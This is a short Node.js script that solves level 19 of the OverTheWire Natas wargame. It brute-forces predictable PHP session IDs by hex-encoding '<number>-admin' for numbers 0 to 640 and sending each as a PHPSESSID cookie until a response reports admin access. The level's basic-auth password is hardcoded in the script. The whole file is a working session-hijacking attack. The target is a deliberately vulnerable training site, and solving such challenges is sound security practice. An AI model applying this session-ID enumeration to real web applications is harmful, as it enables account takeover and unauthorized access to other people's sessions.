var queue = require('queue-async');
var request = require('request');

var natas19 = 'http://natas19.natas.labs.overthewire.org/';
var natas19user = 'natas19';
var natas19pass = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs';

function callback(cb, error, response, body) {
  if (error) {
    return cb(error); 
  } else if (!error && response.statusCode >= 400) {
    return cb(body);
  } else if (!error && response.statusCode === 200) {
    if (body.indexOf('You are an admin') !== -1) {
      return cb(null, body);
    } else {
      return cb();
    }
  }
}

function doRequest(sessionId, next) {
  var jar = request.jar();

  var trial = new Buffer(sessionId + '-admin');

  var cookie = request.cookie('PHPSESSID=' + trial.toString('hex'));

  jar.setCookie(cookie, natas19);

  var r = request.get(natas19, {
    auth: {
      'user': natas19user,
      'pass': natas19pass
    },
    timeout: 10000,
    jar: jar
  }, callback.bind(this, next));
}

var tasks = [];
for (var i=0, l=641; i<l; i+=1) {
  tasks.push(doRequest.bind(null, i));
}

var q = queue(1);
tasks.forEach(function(t) { q.defer(t); });
q.awaitAll(function(error, results) {
  if (error) { return console.error(error); }
  console.log(results);
});
